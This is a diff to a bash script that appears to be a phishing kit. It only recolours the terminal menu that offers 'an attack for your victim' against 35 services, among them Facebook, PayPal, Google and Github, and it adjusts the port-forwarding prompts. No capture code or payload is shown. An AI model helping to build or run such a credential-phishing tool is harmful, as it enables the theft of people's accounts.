@@ -384,7 +384,7 @@ about() {
 cusport() {
 	echo
 
-"${RED}[${WHITE}-${RED}][38;2;0;255;170m Select a port forwarding service : ${BLUE}"
+"${RED}[${WHITE}-${RED}][38;2;0;255;170m Select a port forwarding service : ${WHITE}"
 	
 	read -n1 -p "${RED}[${WHITE}?${RED}][38;2;0;255;170m Do You Want A Custom Port ${WHITE}[${BLUE}y${WHITE}/${BLUE}N${WHITE}]: ${BLUE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
@@ -531,7 +531,7 @@ tunnel_menu() {
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}][38;2;0;255;170m Select a port forwarding service : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}][38;2;0;255;170m Select a port forwarding service : ${WHITE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -739,22 +739,22 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		[38;2;0;51;255m[::][0m Select An Attack For Your Victim [38;2;0;51;255m[::][0m
+		[38;2;0;51;255m[${WHITE}:${WHITE}:][0m Select An Attack For Your Victim [38;2;0;51;255m[${WHITE}:${WHITE}:][0m
 
-		[38;2;0;51;255m[01][0m Facebook      [38;2;0;51;255m[11][0m Twitch       [38;2;0;51;255m[21][0m DeviantArt
-		[38;2;0;51;255m[02][0m Instagram     [38;2;0;51;255m[12][0m Pinterest    [38;2;0;51;255m[22][0m Badoo
-		[38;2;0;51;255m[03][0m Google        [38;2;0;51;255m[13][0m Snapchat     [38;2;0;51;255m[23][0m Origin
-		[38;2;0;51;255m[04][0m Microsoft     [38;2;0;51;255m[14][0m Linkedin     [38;2;0;51;255m[24][0m DropBox	
-		[38;2;0;51;255m[05][0m Netflix       [38;2;0;51;255m[15][0m Ebay         [38;2;0;51;255m[25][0m Yahoo		
-		[38;2;0;51;255m[06][0m Paypal        [38;2;0;51;255m[16][0m Quora        [38;2;0;51;255m[26][0m Wordpress
-		[38;2;0;51;255m[07][0m Steam         [38;2;0;51;255m[17][0m Protonmail   [38;2;0;51;255m[27][0m Yandex			
-		[38;2;0;51;255m[08][0m Twitter       [38;2;0;51;255m[18][0m Spotify      [38;2;0;51;255m[28][0m StackoverFlow
-		[38;2;0;51;255m[09][0m Playstation   [38;2;0;51;255m[19][0m Reddit       [38;2;0;51;255m[29][0m Vk
-		[38;2;0;51;255m[10][0m Tiktok        [38;2;0;51;255m[20][0m Adobe        [38;2;0;51;255m[30][0m XBOX
-		[38;2;0;51;255m[31][0m Mediafire     [38;2;0;51;255m[32][0m Gitlab       [38;2;0;51;255m[33][0m Github
-		[38;2;0;51;255m[34][0m Discord       [38;2;0;51;255m[35][0m Roblox 
+		${WHITE}[[38;2;0;51;255m01${WHITE}] Facebook      ${WHITE}[[38;2;0;51;255m11${WHITE}] Twitch       ${WHITE}[[38;2;0;51;255m21${WHITE}] DeviantArt
+${WHITE}[[38;2;0;51;255m02${WHITE}] Instagram     ${WHITE}[[38;2;0;51;255m12${WHITE}] Pinterest    ${WHITE}[[38;2;0;51;255m22${WHITE}] Badoo
+${WHITE}[[38;2;0;51;255m03${WHITE}] Google        ${WHITE}[[38;2;0;51;255m13${WHITE}] Snapchat     ${WHITE}[[38;2;0;51;255m23${WHITE}] Origin
+${WHITE}[[38;2;0;51;255m04${WHITE}] Microsoft     ${WHITE}[[38;2;0;51;255m14${WHITE}] Linkedin     ${WHITE}[[38;2;0;51;255m24${WHITE}] DropBox	
+${WHITE}[[38;2;0;51;255m05${WHITE}] Netflix       ${WHITE}[[38;2;0;51;255m15${WHITE}] Ebay         ${WHITE}[[38;2;0;51;255m25${WHITE}] Yahoo		
+${WHITE}[[38;2;0;51;255m06${WHITE}] Paypal        ${WHITE}[[38;2;0;51;255m16${WHITE}] Quora        ${WHITE}[[38;2;0;51;255m26${WHITE}] Wordpress
+${WHITE}[[38;2;0;51;255m07${WHITE}] Steam         ${WHITE}[[38;2;0;51;255m17${WHITE}] Protonmail   ${WHITE}[[38;2;0;51;255m27${WHITE}] Yandex			
+${WHITE}[[38;2;0;51;255m08${WHITE}] Twitter       ${WHITE}[[38;2;0;51;255m18${WHITE}] Spotify      ${WHITE}[[38;2;0;51;255m28${WHITE}] StackoverFlow
+${WHITE}[[38;2;0;51;255m09${WHITE}] Playstation   ${WHITE}[[38;2;0;51;255m19${WHITE}] Reddit       ${WHITE}[[38;2;0;51;255m29${WHITE}] Vk
+${WHITE}[[38;2;0;51;255m10${WHITE}] Tiktok        ${WHITE}[[38;2;0;51;255m20${WHITE}] Adobe        ${WHITE}[[38;2;0;51;255m30${WHITE}] XBOX
+${WHITE}[[38;2;0;51;255m31${WHITE}] Mediafire     ${WHITE}[[38;2;0;51;255m32${WHITE}] Gitlab       ${WHITE}[[38;2;0;51;255m33${WHITE}] Github
+${WHITE}[[38;2;0;51;255m34${WHITE}] Discord       ${WHITE}[[38;2;0;51;255m35${WHITE}] Roblox 
 
-		[38;2;0;51;255m[99][0m About         [38;2;0;51;255m[00][0m Exit
+${WHITE}[[38;2;0;51;255m99${WHITE}] About         ${WHITE}[[38;2;0;51;255m00${WHITE}] Exit
 
 	EOF
 	
